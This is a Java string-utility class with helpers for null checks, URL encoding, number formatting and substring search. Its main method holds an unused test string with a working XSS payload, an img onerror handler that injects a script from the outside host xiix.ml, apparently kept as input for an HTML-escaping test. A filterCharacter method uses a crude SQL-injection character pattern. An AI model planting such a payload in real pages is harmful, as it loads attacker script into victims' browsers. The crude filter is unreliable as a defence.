package cn.temobi.core.util;

import java.lang.reflect.Array;
import java.net.URLEncoder;
import java.sql.Clob;
import java.text.DecimalFormat;
import java.text.NumberFormat;
import java.util.Collection;
import java.util.Date;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.lang.StringEscapeUtils;
import org.springframework.web.util.HtmlUtils;

public class StringUtil {
	
	public static boolean isEmpty(Object o) throws IllegalArgumentException {
		if(o == null) return true;
		if(o instanceof String) {
			return (o == null) || (o.toString().trim().length() == 0) || "null".equalsIgnoreCase(o.toString());
		} else if(o instanceof Collection) {
			if(((Collection)o).isEmpty()){
				return true;
			}
		} else if(o.getClass().isArray()) {
			if(Array.getLength(o) == 0){
				return true;
			}
		} else if(o instanceof Map) {
			if(((Map)o).isEmpty()){
				return true;
			}
		}else {
			return false;
		}

		return false;
	}

    // 替换Null为空值
    public static String convertNull(String str) {
        if (str == null) {
            return "";
        }
        return str;
    }

    public static String toString(Integer iSource){
        if(iSource==null) return "";
        else return iSource.toString();
    }

    public static boolean isNullString(String str){
        if(str==null || "".equals(str) || "null".equals(str)) return true;
        return false;
    }

    public static String replaceFirst(String strSource,String regex, String replacement){
        if(isEmpty(strSource)) return "";
        return strSource.replaceFirst(regex,replacement);
    }

    public static String getAvailableURL(String srcURI){
        StringBuffer bufferURI=new StringBuffer();
        if(!isEmpty(srcURI)){
            String[] covertURI=srcURI.split("\\?");
            if(covertURI.length>0 && !isEmpty(covertURI[0])) bufferURI.append(covertURI[0]);
            bufferURI.append("?");
            if(covertURI.length==2){
                String[] parameters=covertURI[1].split("\\&");
                for(int i=0;i<parameters.length;i++){
                    String[] valuePair=parameters[i].split("=");
                    if (valuePair.length == 2) {
                        try {
                            bufferURI.append(valuePair[0]).append("=").append(URLEncoder.encode(valuePair[1], "UTF-8")).append("&");
                        } catch (Exception e) {}
                    }
                }
            }
            return bufferURI.toString();
        }
        return srcURI;
    }

    public static String getStringBeforeSplit(String str, String separator) {
        if (str == null || separator == null || str.length() == 0 || separator.length() == 0) {
            return str;
        }
        int pos = str.lastIndexOf(separator);
        if (pos == -1) {
            return str;
        }
        return str.substring(0, pos);
    }

    public static String getStringAfterSplit(String str, String separator) {
        if (str == null || str.length() == 0) {
            return str;
        }
        if (separator == null || separator.length() == 0) {
            return "";
        }
        int pos = str.lastIndexOf(separator);
        if (pos == -1 || pos == (str.length() - separator.length())) {
            return "";
        }
        return str.substring(pos + separator.length());
    }

    /**
     * 比较页为空时显示无
     * @param str
     * @return
     */
    public static String getEmptyDefaultValue(String str){
        if(StringUtil.isEmpty(str)){
            return "无";
        }else{
            return str;
        }
    }

    public static String getDoubleStr(Double value){
        if(value ==null || "null".equals(value)){
            value = 0.0;    
        }
        return String.valueOf(value);
    }

    public static String getIntegerStr(Integer value){
        if(value ==null || "null".equals(value)){
            value = 0;
        }
        return String.valueOf(value);
    }
    public static Integer getIntegerByStr(String value){
        if(StringUtil.isEmpty(value)){
            value = "0";
        }
        return Integer.valueOf(value);
    }


    public static String parseDoubleStr(String str){
        if(str==null || "".equals(str) || "null".equals(str)){
            str =  "0";    
        }
        return str;
    }
   
    public static String stringValue(Object obj, String defaultValue) {
                if (obj == null) {
                        return defaultValue;
                } else if (obj instanceof String) {
                        return (String) obj;
                } else if (obj instanceof Clob) {
                        return stringValue((Clob) obj, "");
                } else {
                        return obj.toString();
                }
        }
   
    public static String formatDate(Date date,String format){
        if(!StringUtil.isEmpty(format)){
        java.text.SimpleDateFormat sdf=new java.text.SimpleDateFormat(format);
        String c=sdf.format(date);
        return c;
        }
        return null;
    }

   
    public static void main(String[] args){
//         System.out.println(getFormatNumbers("123456", 0, ","));
//         System.out.println(getFormatNumbers("2545625.457", 4, ""));
//         System.out.println(getFormatNumbers("2545625.457878", 4, ""));
//         System.out.println(getFormatNumbers("0.457878", 4, ""));
//         System.out.println(getFormatNumbers("57878", 3, ","));
//         System.out.println(getFormatNumbers(".57878", 3, ","));
//         System.out.println("abc".indexOf("d"));
//         
//         String t="aaaaaaaaaa<table></table>aaa<table></table>";  
//         String s="</TABLE";  
//           
//         System.out.println("length="+t.length());  
//           
//         System.out.println(t.indexOf(s,0));  
//         System.out.println(ignoreIndexOf(t, s,0,true));  
//                   
//         System.out.println(t.lastIndexOf(s));  
//         System.out.println(ignoreLastIndexOf(t, s));
//    	   System.out.println(filterCharacter("aaaa;"));
    	
    	   String html = "</textarea>'><img src=# id=xiix.ml style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxiix.ml%2F5aUVIN%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>";
    	   String a = HtmlUtils.htmlEscape(null);
		   System.out.println(a);
    }
   
    public static String right(String mainStr,int lngLen) {
        if (mainStr.length()-lngLen>=0 && mainStr.length()>=0 && mainStr.length()-lngLen<=mainStr.length()) {
            return mainStr.substring(mainStr.length()-lngLen,mainStr.length());
        }else{
                return null;
        }
    }
   
    /**
     * 长串数字处理，如用千分位分隔，小数点保留几位
     * @param value
     * @param decimalPrecision
     * @param thousandsSeparator
     * @return
     */
    public static String getFormatNumbers(String value, int decimalPrecision,
            String thousandsSeparator) {
        Pattern integerPattern = Pattern.compile("^-?[0-9]*$");
        Pattern thousandsSeparatePattern = Pattern.compile("(\\d{1,3})(?=(\\d{3})+(?:$|\\D))");
        if (decimalPrecision > 0) {
            if (value == null || value.equals("")) {
                if (!Pattern.matches("^-?[0-9]*\\.{0,1}\\d{0,"+ decimalPrecision + "}$", value)) {
                    value = "0";
                }
            }
            String pattern = "0.";
            for (int i = 0; i < decimalPrecision; i++) {
                pattern += "0";
            }
            value = new DecimalFormat(pattern)
                    .format(Double.parseDouble(value));
            String integerPart = value.split("\\.")[0];
            String decimalPart = value.split("\\.")[1];
 
            Matcher matcher = thousandsSeparatePattern.matcher(integerPart);
            integerPart = matcher.replaceAll("$1" + thousandsSeparator);
            value = integerPart + "." + decimalPart;
        } else {
            if (value == null || value.equals("")) {
                if (!integerPattern.matcher(value).find()) {
                    value = "0";
                }
            }
            Matcher matcher = thousandsSeparatePattern.matcher(value);
            value = matcher.replaceAll("$1" + thousandsSeparator);
        }
        return value;
    }
   
    /**
     * 在subject中最先出现search的位置，不区分大小写
     * @param subject 被查询的字符串
     * @param search  要查询的字符串
     * @param soffset
     * @return
     */
    public static int ignoreIndexOf(String subject,String search,int soffset,boolean isIngoreCase){  
        //当被查找字符串或查找子字符串为空时，抛出空指针异常。  
        if (subject == null || search == null) {  
            throw new NullPointerException("输入的参数为空");  
        }  
        if(soffset>=subject.length() && search.equals("")){  
            return subject.length();  
        }  
        for (int i = soffset; i < subject.length(); i++) {  
            if(subject.regionMatches(isIngoreCase, i, search, 0, search.length())){  
                return i;  
            }  
        }  
        return -1;  
    }  
         
    /***
     * 在subject中最后出现search的位置
     * @param subject
     * @param search
     * @return
     */
        public static int ignoreLastIndexOf(String subject,String search) {  
            return ignoreLastIndexOf(subject, search, subject.length(),true);  
        }  
         
        public static int ignoreLastIndexOf(String subject,String search,int soffset,boolean isIngoreCase) {  
           //当被查找字符串或查找子字符串为空时，抛出空指针异常。  
           if (subject == null || search == null) {  
            throw new NullPointerException("输入的参数为空");  
           }  
           if(soffset<=0 && search.equals("")){  
            return 0;  
           }  
           for (int i = soffset; 0 < i; i--) {  
            if(subject.regionMatches(isIngoreCase, i, search, 0, search.length())){  
                return i;  
            }  
           }  
         
           return -1;  
        }
       
        /**
         * 求next数组
         * @param key
         * @return
         */
        public static int[] next(String key) {
                try {
                        int i = 1, j = 0;
                        char[] keys = key.toCharArray();
                        int[] next = new int[keys.length];
                        while (i < keys.length) {
                                if (j == 0 || keys[i - 1] == keys[j - 1]) {
                                        ++j;
                                        next[i] = j;
                                        ++i;
                                } else {
                                        j = next[j - 1];
                                }
                        }
                        return next;
                } catch (Exception e) {
                        e.printStackTrace();
                }
                return null;
        }

        /**
         * 求next数组(前一个next方法的改进版)
         * @param key
         * @return
         */
        public static int[] next2(String key) {
                try {
                        int i = 1, j = 0;
                        char[] keys = key.toCharArray();
                        int[] next = new int[keys.length];
                        while (i < keys.length) {
                                if (j == 0 || keys[i - 1] == keys[j - 1]) {
                                        ++j;
                                        if (keys[i] != keys[j - 1]) {
                                                next[i] = j;
                                        } else {
                                                next[i] = next[j];
                                        }
                                        ++i;
                                } else {
                                        j = next[j - 1];
                                }
                        }
                        return next;
                } catch (Exception e) {
                        e.printStackTrace();
                }
                return null;
        }

        /**
         * 统计在主串中出现模式串的次数
         * @param input
         *            :主串
         * @param key
         *            :模式串
         * @return
         */
        public static int calcKeysFrequency(String input, String key) {
                int i = 0, j = 0, times = 0;
                int[] next = next2(key);
                char[] inputs = input.toCharArray();
                char[] keys = key.toCharArray();
                while (i < inputs.length) {
                        if (j == 0 || inputs[i] == keys[j - 1]) {
                                ++i;
                                if ((++j) > keys.length) {
                                        times++;
                                        j = 0;
                                }
                        } else {
                                j = next[j - 1];
                        }
                }
                return times;
        }
       
        /**
         * 计算百分比
         * @param p1
         * @param total
         * @return
         */
        public static String percent( double  p1,  double  total)  {
        String str;
        double  p3  =  p1  /  total;
        NumberFormat nf  =  NumberFormat.getPercentInstance();
        nf.setMinimumFractionDigits( 2 );
        str = nf.format(p3);
        return  str;
    }
       
        /**
         * 计算字符串字节长度
         * @param s
         * @return
         */
        public static int getStringByteCount(String s)
    {
         int  length  =   0 ;
         for ( int  i  =   0 ; i  <  s.length(); i ++ )
        {
             int  ascii  =  Character.codePointAt(s, i);
             if (ascii  >=   0   &&  ascii  <= 255 )
                length ++ ;
             else
                length  +=   2 ;
               
        }
         return  length;
    }
        
    	/**
    	 * 可以用于判断 Map,Collection,String,Array是否不为空
    	 * @param o
    	 * @return
    	 */
    	public static boolean isNotEmpty(Object o) {
    		return !isEmpty(o);
    	}

    	public static boolean isNotBlank(Object o) {
    		return !isBlank(o);
    	}

    	public static boolean isNumber(Object o) {
    		if(o == null) return false;
    		if(o instanceof Number) {
    			return true;
    		}
    		if(o instanceof String) {
    			String str = (String)o;
    			if(str.length() == 0) return false;
    			if(str.trim().length() == 0) return false;
    			return org.apache.commons.lang.StringUtils.isNumeric(str);
    		}
    		return false;
    	}

    	public static boolean isBlank(Object o) {
    		if(o == null)
    			return true;
    		if(o instanceof String) {
    			String str = (String)o;
    			return isBlank(str);
    		}
    		return false;
    	}

    	public static boolean isBlank(String str) {
    		if(str == null || str.length() == 0) {
    			return true;
    		}

    		for (int i = 0; i < str.length(); i++) {
    			if (!Character.isWhitespace(str.charAt(i))) {
    				return false;
    			}
    		}
    		return true;
    	}
    	
    	//过滤特殊字符
    	public static boolean filterCharacter(String str) {

    		if(StringUtil.isEmpty(str))
    		{
    			return false;
    		}
    		String zip = ";|\'|--";
    		Pattern p = Pattern.compile(zip);
    		
    		Matcher m = p.matcher(str);

    		boolean b = m.find();
    		return b;
    	}
    	
    	
    	//取出字符串中"\r\n"
    	public static String removeCharacter(String str) {

    		if(StringUtil.isEmpty(str))
    		{
    			return str.replace("\r", "").replace("\n", "").trim();
    		}
    		return str;
    	}
    	
}

